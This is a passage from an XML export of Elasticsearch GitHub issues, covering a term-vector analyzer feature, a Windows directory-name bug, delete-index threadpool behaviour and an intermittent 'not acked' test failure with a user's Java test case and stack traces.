</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support for custom analyzers in term vectors and MLT query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7801</link><project id="" key="" /><description>This adds a `per_field_analyzer` parameter to the Term Vectors API, which
allows to override the default analyzer at the field. If the field already
stores term vectors, then they will be re-generated. Since the MLT Query uses
the Term Vectors API under its hood, this commits also adds the same ability
to the MLT Query, thereby allowing users to fine grain how each field item
should be processed and analyzed.
</description><key id="43234257">7801</key><summary>Support for custom analyzers in term vectors and MLT query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-19T12:46:48Z</created><updated>2015-06-07T17:39:27Z</updated><resolved>2014-10-03T14:40:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="alexksikes" created="2014-09-19T12:47:16Z" id="56172243">Note: this should be merged after https://github.com/elasticsearch/elasticsearch/pull/7725
</comment><comment author="jpountz" created="2014-10-02T23:01:45Z" id="57723044">Left some minor comments but it looks good overall!
</comment><comment author="jpountz" created="2014-10-03T14:25:31Z" id="57802926">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Failed to write index state due to incorrect syntax in directory name</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7800</link><project id="" key="" /><description>I tried to run elasticsearch 1.3.2 under Windows (7 Enterprise) but it failed due to an invalid directory name "localhost:9200" which contains a colon.

The version 1.3.0, 1.3.1 are also effected. Version 1.2.4 works. On Linux the problem does not exist because colons can be used in directory and file names. 

Here is the full stacktrace

```
[2014-09-19 14:12:17,210][WARN ][gateway.local.state.meta ] [Wolf] [localhost:9200]: failed to write index state
java.io.FileNotFoundException: D:\dev\elasticsearch-1.3.2\data\elasticsearch\nodes\0\indices\localhost:9200\_state\state
-1 (The filename, directory name, or volume label syntax is incorrect)
        at java.io.FileOutputStream.open(Native Method)
        at java.io.FileOutputStream.&lt;init&gt;(FileOutputStream.java:212)
        at java.io.FileOutputStream.&lt;init&gt;(FileOutputStream.java:165)
        at org.elasticsearch.gateway.local.state.meta.LocalGatewayMetaState.writeIndex(LocalGatewayMetaState.java:359)
        at org.elasticsearch.gateway.local.state.meta.LocalGatewayMetaState.clusterChanged(LocalGatewayMetaState.java:21
7)
        at org.elasticsearch.gateway.local.LocalGateway.clusterChanged(LocalGateway.java:207)
        at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:450)
        at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(P
rioritizedEsThreadPoolExecutor.java:153)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:722)
```
</description><key id="43232485">7800</key><summary>Failed to write index state due to incorrect syntax in directory name</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">MikeZuehlke</reporter><labels /><created>2014-09-19T12:25:15Z</created><updated>2014-09-29T15:24:07Z</updated><resolved>2014-09-29T15:24:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="MikeZuehlke" created="2014-09-22T08:45:45Z" id="56344973">After playing with version 1.2.4 I faced the same error. Deleting the data directory helped to resolve the issue. I tried again the versions 1.3.\* after deleting the data directory and IT WORKS.
</comment><comment author="clintongormley" created="2014-09-29T15:24:07Z" id="57177704">OK - so looks like this was caused by an invalid file name. Did you move the data directory from a linux box?  How did that directory come to exist?

I'm going to close this in favour of #6736
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Force execution of delete index requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7799</link><project id="" key="" /><description>The management threadpool is now bouned and can reject executions.
We should make sure that delete index operations are forced on the
threadpool.
</description><key id="43225203">7799</key><summary>Force execution of delete index requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-19T10:35:17Z</created><updated>2015-06-07T12:01:10Z</updated><resolved>2014-10-07T11:46:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-19T10:36:03Z" id="56161585">@martijnvg / @kimchy can you take a look
</comment><comment author="martijnvg" created="2014-09-19T20:17:44Z" id="56229256">LGTM. I wonder if we should also do this in MetaDataDeleteIndexService#createIndex() ?
</comment><comment author="s1monw" created="2014-09-20T07:30:59Z" id="56259586">&gt; I wonder if we should also do this in MetaDataDeleteIndexService#createIndex() 

so I didn't do this since my rational behind this change is that we should clear resources even if we are under pressure since it might be the source of the pressure. Yet this is not true for creating resources so I think we shouldn't do that for the create case? 
</comment><comment author="kimchy" created="2014-09-20T08:53:06Z" id="56261346">@s1monw I am concerned that just queuing will not help much? if there is some reason that the server is under load and can't process metadata requests, and indices are not the reason for it (network, something else), then we get back to the original reason of why the management TP because bounded in the first place. With force queue of the delete request, then we will just keep on increasing the queue?
</comment><comment author="s1monw" created="2014-09-24T20:00:36Z" id="56729400">like the reason for an overloaded management queue is too many mapping updates. I think we should force the execution of the delete calls here since they free resources. if you find a better way to make the delete index reliable and not rejected just because somebody goes wild with dynamic mappings is fine with me too :)
</comment><comment author="s1monw" created="2014-10-07T11:46:38Z" id="58172084">we moved back to a scaling threadpool here so I am closing this since it's invalid
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Delete Index failed - not acked</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7798</link><project id="" key="" /><description>I am getting this error intermittently in the teardown of our tests (using ElasticsearchIntegrationTest).

Elastic 1.3.2 on Java 1.7 u65 on linux.

I cannot see why we should be getting this.

```
java.lang.AssertionError: Delete Index failed - not acked
Expected: &lt;true&gt;
     but: was &lt;false&gt;
    at __randomizedtesting.SeedInfo.seed([AB0B449635AD3C03:63F22B491E5E9323]:0)
    at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:20)
    at org.elasticsearch.test.hamcrest.ElasticsearchAssertions.assertAcked(ElasticsearchAssertions.java:111)
    at org.elasticsearch.test.hamcrest.ElasticsearchAssertions.assertAcked(ElasticsearchAssertions.java:107)
    at org.elasticsearch.test.TestCluster.wipeIndices(TestCluster.java:128)
    at org.elasticsearch.test.TestCluster.wipe(TestCluster.java:70)
    at org.elasticsearch.test.ElasticsearchIntegrationTest.afterInternal(ElasticsearchIntegrationTest.java:540)
    at org.elasticsearch.test.ElasticsearchIntegrationTest.after(ElasticsearchIntegrationTest.java:1547)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:606)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1618)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:885)
    at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:50)
    at org.apache.lucene.util.TestRuleFieldCacheSanity$1.evaluate(TestRuleFieldCacheSanity.java:51)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:46)
    at com.carrotsearch.randomizedtesting.rules.SystemPropertiesInvariantRule$1.evaluate(SystemPropertiesInvariantRule.java:55)
    at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:49)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:65)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:48)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:360)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:793)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:453)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:836)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$3.evaluate(RandomizedRunner.java:738)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$4.evaluate(RandomizedRunner.java:772)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:783)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:46)
    at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:42)
    at com.carrotsearch.randomizedtesting.rules.SystemPropertiesInvariantRule$1.evaluate(SystemPropertiesInvariantRule.java:55)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:39)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:39)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:43)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:48)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:65)
    at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:55)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:360)
    at java.lang.Thread.run(Thread.java:745)
```
</description><key id="43221311">7798</key><summary>Delete Index failed - not acked</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">nickminutello</reporter><labels><label>feedback_needed</label><label>test</label></labels><created>2014-09-19T09:40:06Z</created><updated>2015-02-28T04:54:07Z</updated><resolved>2015-02-28T04:54:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-19T09:41:31Z" id="56157039">can you tell what your test is doing or maybe even share it?
</comment><comment author="nickminutello" created="2014-09-19T13:07:01Z" id="56174218">It happens for different tests - there doesn't seem to be a pattern.
The tests index some documents &amp; then run searches or aggregations...some tests use scrolling api.

Our tests are configured thus:

```
@ElasticsearchIntegrationTest.ClusterScope(scope = TEST, numClientNodes = 0, numDataNodes = 1)
```
</comment><comment author="nickminutello" created="2014-09-22T10:08:23Z" id="56353019">What does it actually mean that "not acked" - does it think the operation time out?
</comment><comment author="javanna" created="2014-09-23T08:15:36Z" id="56488136">Hi @nickminutello every time a cluster state update needs to happen (happens when you delete an index for instance), it needs to be processed on the master node first. Once the master is done with that, it sends the new cluster state to all the other nodes in the cluster, which ack that once they processed it. If the response that you get is not acked, that means that at least one of the nodes didn't ack within the ack timeout (`timeout` request parameter, defaults to 30 seconds). The operation itself didn't timeout, only the processing on some of the non master nodes did. When retrieving the cluster state via cluster state api you would still get the latest one since the call goes to the master by default, which always has the most up-to-date version of it, but some of the non master nodes might be lagging behind. You can use the `local` flag to retrieve the local cluster state taken from the node that you hit with your call. It woud be interesting to understand which node(s) is not acking the delete index and why. Anything else that is running concurrently while testing?
</comment><comment author="nickminutello" created="2014-09-23T09:25:48Z" id="56494588">No, the tests are running on a TeamCity build agent. As far as I am aware, thats all that is happening.
In particular, the failure is happening in a test teardown (in the index deletion).

Given our usage of the following annotation:

``` java
@ElasticsearchIntegrationTest.ClusterScope(scope = TEST, numClientNodes = 0, numDataNodes = 1)
```

There should only be one (master) node, right? So I dont understand where the timeout occurred.
</comment><comment author="nickminutello" created="2014-09-29T10:41:10Z" id="57143573">The intermittent failing tests are creating havoc with our CI ... and I am no nearer to understanding the cause :(
</comment><comment author="clintongormley" created="2014-09-30T18:03:02Z" id="57355814">@nickminutello i'd suggest showing the code in your test, either here or in a gist.
</comment><comment author="nickminutello" created="2014-10-02T15:34:52Z" id="57648568">I will try paste the contents of a test - its nothing too exciting - and the failures are very much at random (you never know which test might fail in cleanup)
</comment><comment author="clintongormley" created="2014-10-14T16:13:23Z" id="59072025">Hi @nickminutello 

Any more info on this?
</comment><comment author="s1monw" created="2014-10-31T21:37:05Z" id="61335044">@nickminutello can you share this testcase that hits this? is it reproducible?
</comment><comment author="mikemccand" created="2014-11-09T11:43:55Z" id="62300510">@nickminutello I think you may be hitting #8405 
</comment><comment author="nickminutello" created="2014-11-17T17:41:08Z" id="63343385">It could be - but given our tests only index a small amount of data, I cant see it taking longer than 30s to delete.
HOWEVER, we could be timing out because our build-agent is heavily overloaded (its running on a linux vm - which is on a host that is heavily over-subscribed). We have _never_ been able to reproduce it locally (maybe because we arent re-creating the same overloaded OS behaviour)

So we probably are seeing some kind of "timeout" - but its not clear from the error message that there was a timeout. 

In any case, where is this timeout value set? I couldnt see anything from the elastic test support code that indicated any kind of timeout being used.

In any case, here is our testcase. 
Note that there are no assertions - since its not the test that fails - just the index deletion on cleanup.

``` java
@ElasticsearchIntegrationTest.ClusterScope(scope = TEST, numClientNodes = 0, numDataNodes = 1)
public class ElasticBugsMoo extends ElasticsearchIntegrationTest
{
    private static final String INDEX = "bugindex";
    private final ObjectMapper json = new ObjectMapper();

    public ElasticBugsMoo()
    {
        json.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
        json.configure(SerializationFeature.WRITE_BIGDECIMAL_AS_PLAIN, true);
        json.configure(DeserializationFeature.USE_BIG_DECIMAL_FOR_FLOATS, true);
        json.configure(JsonGenerator.Feature.ESCAPE_NON_ASCII, true);
        json.registerModule(new JodaModule());
    }

    @Override
    protected Settings nodeSettings(int nodeOrdinal)
    {
        return settingsBuilder()
            .put("path.data", "target/elastic-test-data")
            .build();
    }

    private void index(String id, String type, String content) throws IOException
    {
        //noinspection unchecked
        index(INDEX, type, id, json.readValue(content, Map.class));
    }

    @Test
    public void deleteIndexFailedNotAcked() throws IOException
    {
        String settingsSource = "{\"analysis\":{\"analyzer\":{\"logistics_index\":{\"tokenizer\":\"whitespace\",\"filter\":[\"lowercase\"]},\"logistics_search\":{\"tokenizer\":\"whitespace\",\"filter\":[\"lowercase\"]},\"default_index\":{\"type\":\"combo\",\"deduplication\":\"true\",\"sub_analyzers\":[\"logistics_index\",\"standard\"]},\"default_search\":{\"type\":\"combo\",\"deduplication\":\"true\",\"sub_analyzers\":[\"logistics_search\",\"standard\"]}}},\"number_of_replicas\":0}";
        admin()
            .indices()
            .prepareCreate(INDEX)
            .setSettings(settingsSource)
            .execute()
            .actionGet();

        String propertiesSource = "{\"properties\":{\"contractualLocationCity\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"quantityUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"contractualLocationCountry\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"isAllocationNotInvoiced\":{\"type\":\"boolean\"},\"quotaStatusLabel\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"isFullyAllocated\":{\"type\":\"boolean\"},\"contractualLocation\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"allocatedQuantity\":{\"type\":\"double\"},\"quantityNormalisedUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"isInvoicedFinal\":{\"type\":\"boolean\"},\"quotaId\":{\"type\":\"long\"},\"counterParty\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"allocationStatus\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"quantity\":{\"type\":\"double\"},\"allocatedQuantityUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"customTokens\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"tradeRef\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"unallocatedQuantity\":{\"type\":\"double\"},\"contract\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"contractualLocationCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"shape\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"quotaStatus\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"invoiceStatus\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"unallocatedQuantityNormalisedUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"allocatedQuantityNormalised\":{\"type\":\"double\"},\"isActive\":{\"type\":\"boolean\"},\"shipmentDate\":{\"format\":\"date\",\"type\":\"date\"},\"completedDate\":{\"format\":\"date\",\"type\":\"date\"},\"groupCompany\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"allocationStatusLabel\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"invoiceQuantity\":{\"type\":\"double\"},\"resolvedIds\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"expectedSalesMonth\":{\"format\":\"date\",\"type\":\"date\"},\"expectedSalesLocationCity\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"isCancelled\":{\"type\":\"boolean\"},\"neptuneQuotaId\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"contractDutyPaid\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"unallocatedQuantityNormalised\":{\"type\":\"double\"},\"contractIncotermsCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"groupCompanyCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"grade\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"invoiceQuantityUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"unallocatedQuantityUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"counterPartyCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"allocatedQuantityNormalisedUnitOfMeasure\":{\"index\":\"no\",\"type\":\"string\"},\"isPurchase\":{\"type\":\"boolean\"},\"trafficOperatorFullName\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"groupCompanyId\":{\"include_in_all\":false,\"index\":\"not_analyzed\",\"type\":\"string\"},\"expectedSalesLocation\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"intentIncotermsCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"trafficOperatorSid\":{\"include_in_all\":false,\"index\":\"not_analyzed\",\"type\":\"string\"},\"quantityNormalised\":{\"type\":\"double\"},\"commodity\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"contractIncoterms\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"expectedSalesLocationCode\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"brand\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"quotaType\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"expectedSalesLocationCountry\":{\"index\":\"not_analyzed\",\"type\":\"string\"},\"quotaRef\":{\"index\":\"not_analyzed\",\"boost\":2.0,\"type\":\"string\"},\"comments\":{\"type\":\"string\"},\"intentIncoterms\":{\"index\":\"not_analyzed\",\"type\":\"string\"}}}";
        admin()
            .indices()
            .preparePutMapping(INDEX)
            .setType("quota")
            .setSource(propertiesSource)
            .execute()
            .actionGet();

        index("1563150401", "quota", "{\"allocatedQuantity\":1000.0000,\"allocatedQuantityNormalised\":1000.0000,\"allocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocationStatus\":\"PARTIALLY_ALLOCATED\",\"allocationStatusLabel\":\"Partially Allocated\",\"brand\":\"ACME\u2122\",\"comments\":\"TIC-P.26884TSHS\",\"commodity\":\"0# (99.995%) sand\",\"completedDate\":\"2014-11-16\",\"contract\":\"contract\",\"contractDutyPaid\":null,\"counterParty\":\"Corporacion de Acero \\\"Corpacero\\\"\",\"counterPartyCode\":\"\u804DZ\uDB7C\uDF82L\uB86A\uDAE4\uDE90\",\"customTokens\":[\"Flat square\",\"99.995%\"],\"expectedSalesMonth\":\"2014-11-17\",\"grade\":\"99.97%\",\"groupCompany\":\"GROUP-COMPANY-NAME-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyCode\":\"GROUP-COMPANY-CODE-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyId\":\"D99DCC1027854A4A922C37DFCCA383DC\",\"invoiceQuantity\":1000.0000,\"invoiceQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"invoiceStatus\":\"NOTFINALINVOICED\",\"isActive\":true,\"isAllocationNotInvoiced\":false,\"isCancelled\":false,\"isFullyAllocated\":false,\"isInvoicedFinal\":false,\"isPurchase\":true,\"neptuneQuotaId\":\"neptune-quota-id\",\"quantity\":1000.0000,\"quantityNormalised\":1000.0000,\"quantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quotaId\":1563150401,\"quotaRef\":\"6775.2\",\"quotaStatus\":\"COMPLETED\",\"quotaStatusLabel\":\"Completed\",\"quotaType\":\"PURCHASE\",\"resolvedIds\":[\"2CBD832AD9BE44FBA0C8E70E0E7A529E\",\"0EAB028E816D458DA1F765C6374C9386\",\"02C11D517A2F49AD8A53F255659E9260\",\"D99DCC1027854A4A922C37DFCCA383DC\",\"1569C43411D24E61A9C7D40D98F106C8\",\"811FD5137CB04E67AE90B08E5D8DAA53\",\"8BFD8633E4214B60957A1357069EE0B3\",\"E75A29FBE34D4461A9C8E5951CD15207\",\"2269C24D7A7844F7A7DAFB763FC75EE8\",\"55C445000CA14A3AA8A15FE37AF59015\",\"532150BA73844BEBA101B4EED9D9AD97\",\"3410FEF0BCAC4C55B686E31738177DBB\",\"8EBB9138B839470393003185BCF9FE02\"],\"shape\":\"Flat(square)\",\"shipmentDate\":\"2014-12-02\",\"tradeRef\":\"edm-trade-id\",\"trafficOperatorFullName\":\"Unknown User\",\"trafficOperatorSid\":\"UNKNOWN-USER-SID-8EBB9138B839470393003185BCF9FE02\",\"unallocatedQuantity\":1000.0000,\"unallocatedQuantityNormalised\":1000.0000,\"unallocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"unallocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\"}");
        index("1459932957", "quota", "{\"allocatedQuantity\":1000.0000,\"allocatedQuantityNormalised\":1000.0000,\"allocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocationStatus\":\"PARTIALLY_ALLOCATED\",\"allocationStatusLabel\":\"Partially Allocated\",\"brand\":\"Any Brand\",\"comments\":\"comments...\",\"commodity\":\"\\f\uED97i\u0146+\u0438\",\"completedDate\":\"2014-11-16\",\"contract\":\"contract\",\"contractDutyPaid\":null,\"customTokens\":[],\"expectedSalesMonth\":\"2014-11-17\",\"grade\":null,\"groupCompany\":\"GROUP-COMPANY-NAME-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyCode\":\"GROUP-COMPANY-CODE-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyId\":\"D99DCC1027854A4A922C37DFCCA383DC\",\"invoiceQuantity\":1000.0000,\"invoiceQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"invoiceStatus\":\"NOTFINALINVOICED\",\"isActive\":true,\"isAllocationNotInvoiced\":false,\"isCancelled\":false,\"isFullyAllocated\":false,\"isInvoicedFinal\":false,\"isPurchase\":true,\"neptuneQuotaId\":\"neptune-quota-id\",\"quantity\":1000.0000,\"quantityNormalised\":1000.0000,\"quantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quotaId\":1459932957,\"quotaRef\":\"6775.1\",\"quotaStatus\":\"COMPLETED\",\"quotaStatusLabel\":\"Completed\",\"quotaType\":\"PURCHASE\",\"resolvedIds\":[\"F06881353B9D4756BE580C0931189A94\",\"39E34BCAED5E450892391204C6865816\",\"10AB18CA8AAD4EE0922D8BAE8DB35688\",\"64A670281F7A4F1499754F631C5B4251\",\"6B4987E5DC114C4D80B1B6EE1F8388E4\",\"423E598F4829480DBDC40D61DC54306E\",\"9647CA439B234C068DD93D542E8382EA\",\"D99DCC1027854A4A922C37DFCCA383DC\",\"19E31892366C4B4C9715BB6FA6843E9D\",\"F61B663E722444E4B48D62BB27CE8365\",\"532150BA73844BEBA101B4EED9D9AD97\",\"5DDCECD3E741439F9BC60A6B9D03CF74\",\"C945503A0C8B48209781634BE290FA86\"],\"shape\":\"Any Shape\",\"shipmentDate\":\"2014-12-02\",\"tradeRef\":\"edm-trade-id\",\"trafficOperatorFullName\":\"Unknown User\",\"trafficOperatorSid\":\"UNKNOWN-USER-SID-423E598F4829480DBDC40D61DC54306E\",\"unallocatedQuantity\":1000.0000,\"unallocatedQuantityNormalised\":1000.0000,\"unallocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"unallocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\"}");
        index("688731920", "quota",
            "{\"allocatedQuantity\":1000.0000,\"allocatedQuantityNormalised\":1000.0000,\"allocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"allocationStatus\":\"PARTIALLY_ALLOCATED\",\"allocationStatusLabel\":\"Partially Allocated\",\"brand\":\"Any Brand\",\"comments\":\"comments...\",\"commodity\":\"\\f\uED97i\u0146+\u0438\",\"completedDate\":\"2014-11-16\",\"contract\":\"contract\",\"contractDutyPaid\":null,\"customTokens\":[],\"expectedSalesMonth\":\"2014-11-17\",\"grade\":null,\"groupCompany\":\"GROUP-COMPANY-NAME-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyCode\":\"GROUP-COMPANY-CODE-\uD8AD\uDCA9\\u0003\u7CDF\uC753\uDB14\uDE39\uAEDB\u00FA\uE682'\u5720\",\"groupCompanyId\":\"D99DCC1027854A4A922C37DFCCA383DC\",\"invoiceQuantity\":1000.0000,\"invoiceQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"invoiceStatus\":\"NOTFINALINVOICED\",\"isActive\":true,\"isAllocationNotInvoiced\":false,\"isCancelled\":false,\"isFullyAllocated\":false,\"isInvoicedFinal\":false,\"isPurchase\":true,\"neptuneQuotaId\":\"neptune-quota-id\",\"quantity\":1000.0000,\"quantityNormalised\":1000.0000,\"quantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"quotaId\":688731920,\"quotaRef\":\"6775.3\",\"quotaStatus\":\"COMPLETED\",\"quotaStatusLabel\":\"Completed\",\"quotaType\":\"PURCHASE\",\"resolvedIds\":[\"39E34BCAED5E450892391204C6865816\",\"E0132